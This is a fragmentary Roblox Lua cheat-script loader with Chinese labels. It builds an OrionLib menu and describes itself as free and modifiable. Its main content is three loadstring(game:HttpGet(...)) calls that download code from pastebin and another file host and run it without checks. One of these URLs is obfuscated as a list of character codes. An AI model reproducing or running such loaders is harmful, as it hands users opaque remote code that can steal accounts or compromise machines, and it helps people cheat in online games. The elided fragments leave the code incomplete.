...
local Window = OrionLib:MakeWindow({Name = "赤脚本", HidePremium = false, SaveConfig = true,IntroText = "赤脚本", ConfigFolder = "赤脚本"})
game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "赤脚本"; Text ="赤脚本"; Duration = 4; })
...
about:AddParagraph("脚本为免费脚本 可二改")
...
_G["风扇脚本值得拥有可能以后不免费"]="2024dncxddtsnchzxtb0112"loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,100,71,83,99,80,56,89,68})end)())))()
...
loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/8304/%E8%80%81%E5%A4%A7%E8%84%9A%E6%9C%AC1.0%E7%89%88.txt?sign=XJCkkE2J2xaxYQTQmO4T6kL0qRzZspxAXQX7xdaPGbU%3D%3A0"))()
...
loadstring(game:HttpGet("https://pastebin.com/raw/1k7RAfQJ"))()
